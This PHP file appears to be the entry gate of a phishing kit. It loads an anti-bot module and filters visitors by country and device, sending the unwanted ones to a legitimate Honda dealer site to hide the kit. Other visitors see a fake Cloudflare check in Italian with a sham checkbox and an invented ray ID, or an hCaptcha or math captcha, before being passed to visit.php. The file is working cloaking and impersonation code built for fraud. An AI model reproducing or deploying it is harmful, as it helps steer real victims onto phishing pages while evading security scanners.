<?php
include "./antibots-debug/antibots.php";
include "./libraries/get-country-code.php";
$jsonFilePath = "./panel/admin/admin.json";
$json_data = file_get_contents($jsonFilePath);
$settings_data = json_decode($json_data, true);
$recaptcha_mode = $settings_data['recaptcha_mode'];
$recaptcha_type = $settings_data['recaptcha_type'];
$devices_mode = $settings_data['devices_mode'];
$countrys_allow = $settings_data['countrys_allow'];
$countrys_mode = $settings_data['countrys_mode'];
$userCountryCode = $detector->api();
$_SESSION['code_country_visit'] = $userCountryCode;

// Allowed Countries :
if ($countrys_mode === "specific"){
    if (!in_array(strtoupper($userCountryCode), array_map('strtoupper', $countrys_allow))) {
        header("Location: https://www.superhonda.com/");
        exit;
    }
}

// Devices : 
if ($devices_mode === "desktop") {
    function isDesktop() {
        $desktop_agents = array(
            // Windows operating systems (all major versions including Windows 11)
            'Windows NT 10.0',  // Windows 10
            'Windows NT 11.0',  // Windows 11
            'Windows NT 6.3',   // Windows 8.1
            'Windows NT 6.2',   // Windows 8
            'Windows NT 6.1',   // Windows 7
            'Windows NT 6.0',   // Windows Vista
            'Windows NT 5.1',   // Windows XP
            'Windows NT 5.2',   // Windows Server 2003
            'Windows NT 4.0',   // Windows NT 4
            'Windows 98',       // Windows 98
            'Windows 95',       // Windows 95
            'Windows CE',       // Windows CE (embedded systems)
    
            // macOS operating systems (all versions)
            'Macintosh',        // macOS (generic)
            'Mac OS X',         // macOS (older versions)
            'Macintosh; Intel Mac OS X', // macOS on Intel processors
            'Macintosh; PPC Mac OS X',   // macOS on PowerPC processors
    
            // Linux distributions
            'Linux',            // Generic Linux
            'X11',              // X11-based UNIX operating systems
            'Ubuntu',           // Ubuntu Linux
            'Debian',           // Debian Linux
            'Fedora',           // Fedora Linux
            'Red Hat',          // Red Hat Linux
            'Linux Mint',       // Linux Mint
            'CentOS',           // CentOS Linux
            'Arch',             // Arch Linux
            'SUSE',             // SUSE Linux
            'Manjaro',          // Manjaro Linux
    
            // Chrome OS
            'Chrome OS',        // Chrome OS by Google
    
            // Other UNIX-based systems
            'BSD',              // BSD UNIX systems
            'Solaris',          // Oracle Solaris
    
            // Other desktop systems
            'Cygwin',           // Cygwin (UNIX-like environment for Windows)
            'Darwin',           // Apple Darwin OS (macOS's core)
            'Haiku',            // Haiku OS
        );
    
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        foreach ($desktop_agents as $desktop) {
            if (strpos($user_agent, $desktop) !== false) {
                return true;
            }
        }
        return false;
    }
    
    if (!isDesktop()) {
        header("Location: https://www.superhonda.com/");
        exit();
    }
}
elseif ($devices_mode === "mobile") {
    function isMobileOrTablet() {
        return preg_match("/(android|webOS|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet|nokia|windows phone|kindle|silk|playbook|xoom|sm-t|gt-p|sony|motorola|lg|htc|samsung|nexus|surface|firefox os|tab|ipad mini|ipad air|ipad pro|galaxy|huawei|xiaomi|oppo|sony|asus|lenovo|htc|alcatel|zte|miui|poco|realme|oneplus|vivo|lava|karbonn|lava|micromax|meizu|infinix|tecno|sharp|panasonic|samsung|wiko|intex|gionee|umidigi|bq|doogee|cubot|ulefone|leeco|smartphone|tablet|phablet|xiaomi|gpad|lg pad|tcl|sony tablet)/i", $_SERVER['HTTP_USER_AGENT']);
    }
    
    if (!isMobileOrTablet()) {
        header("Location: https://www.superhonda.com/");
        exit();
    }
}

// Captcha :
if ($recaptcha_mode === 0 && $recaptcha_type === "off-type") {
    echo 
    "<script>
        window.location = './visit.php';
    </script>";
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "cloudflare") {
    $cloudflare ='<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
                <!-- Font Google -->
                <link rel="preconnect" href="https://fonts.googleapis.com">
                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
                <link rel="stylesheet" href="./panel/css/captcha.css">
                <title>Verifica</title>
            </head>
            <body class="body-captcha-1">
                <div class="recaptcha">
                    <div class="container">
                        <div class="content-recaptcha">
                            <h1>Verifica</h1>
                            <p class="p-explain-one" id="pExplainOne">
                               Assurez-vous que vous êtes humain en suivant ces étapes.
                            </p>
                            <div class="checking-not-robot" id="parentChecking">
                                <div class="parent-input-check-box">
                                    <input type="checkbox" name="checkbox" class="input-checkbox" id="checkbox">
                                    <label for="checkbox" id="textExplain">Ammetti di essere umano</label>
                                    <div class="parent-animation hidden" id="animationElement">
                                        <img src="./panel/img/animation-first.png">
                                    </div>
                                </div>
                                <div class="parent-logo">
                                    <img src="./panel/img/logo-recaptcha.png" alt="">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="footer-recaptcha">
                    <div class="container">
                        <div class="content-footer-recaptcha">
                            <span>Identificazione dei fulmini : <code>8b0247f5fcad1537</code></span>
                            <p>Prestazioni e sicurezza garantite da Cloudflare</p>
                        </div>
                    </div>

                </div>

                <script>
                    const checkbox = document.getElementById("checkbox");
                    const textExplain = document.getElementById("textExplain");
                    const animationElement = document.getElementById("animationElement");
                    const parentChecking = document.getElementById("parentChecking");
                    
                    
                    setTimeout(function() {
                        animationElement.classList.add("hidden");
                        textExplain.innerText = "Ammetti di essere umano";
                    }, 5000);

                    checkbox.addEventListener("click", ()=>{
                        animationElement.classList.remove("hidden");
                        textExplain.innerText = "Verifica...";
                        setTimeout(function() {
                            window.location = "./visit.php";
                        }, 3000);
                    });
                </script>


            </body>
        </html>';

    echo $cloudflare;
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "hcaptcha") {
    $hcaptcha = 
    '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <!-- Font Google -->
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
            <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
            <link rel="stylesheet" href="./panel/css/captcha.css">
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script src="https://www.hCaptcha.com/1/api.js" async defer></script>
            <title>Verifica</title>
        </head>
        <body class="">
            <div class="nav-bar-first">
                <div class="logo">
                    <img src="./panel/img/hcaptcha.svg" alt="">
                </div>
            </div>
        
            <div class="parent-checking">
                <h1>Verifica</h1>
                <div class="h-captcha" data-sitekey="d94b46f4-dff1-430b-a0bd-d04acdf38fa9" data-callback="onSubmit"></div>
                <div class="error-message" id="error-message"></div>
            </div>
            <script>
                function onSubmit(response) {
                    $.ajax({
                        url: "./panel/actions/verify.php",
                        type: "POST",
                        data: {
                            "h-captcha-response": response
                        },
                        success: function(data) {
                            if (data === "success") {
                                window.location.href = "visit.php";
                            } else {
                                $("#error-message").html("Please verify you are not a robot");
                            }
                        },
                        error: function() {
                            $("#error-message").html("An error occurred, please try again");
                        }
                    });
                }
            </script>
        </body>
        </html>';
    echo $hcaptcha;
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "captcha_calc") {
    $captcha_calc = 
    '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- Font Google -->
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
        <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
        <link rel="stylesheet" href="./panel/css/captcha.css">
        <title>Verifica</title>
    </head>
    <body>
        <div class="content">
            <div class="captcha-container">
                <div class="logo">
                    <img src="./panel/img/logo-captcha-calc.svg" alt="">
                </div>
                <p>
                    Rispondi a questa semplice domanda di matematica per confermare che sei un essere umano e non un robot.
                </p>
                <div class="captcha-text" id="captchaOperation"></div>
                
                <div class="p-i-a-btn">
                    <input type="tel" id="captchaInput" class="captcha-input" placeholder="Inserisci il risultato">
                    <button class="verify-btn" onclick="verifyCaptcha()">Controllo del risultato</button>
                </div>
                <div id="resultMessage" class="result"></div>
            </div>
        </div>
        <script>
            const captchaInput=document.getElementById("captchaInput");captchaInput.addEventListener("input",function(){this.value=this.value.replace(/[^0-9]/g,"")});let num1,num2;function generateCaptcha(){num1=Math.floor(10*Math.random())+1,num2=Math.floor(10*Math.random())+1,document.getElementById("captchaOperation").innerText=`${num1} + ${num2} = ?`,document.getElementById("captchaInput").value=""}function verifyCaptcha(){let e=parseInt(document.getElementById("captchaInput").value),t=document.getElementById("resultMessage");e===num1+num2?window.location.href="visit.php":(t.style.color="red",t.innerText="Sbagliato, riprova.",generateCaptcha())}window.onload=generateCaptcha;
        </script>
    </body>
    </html>';
    echo $captcha_calc;
}

?>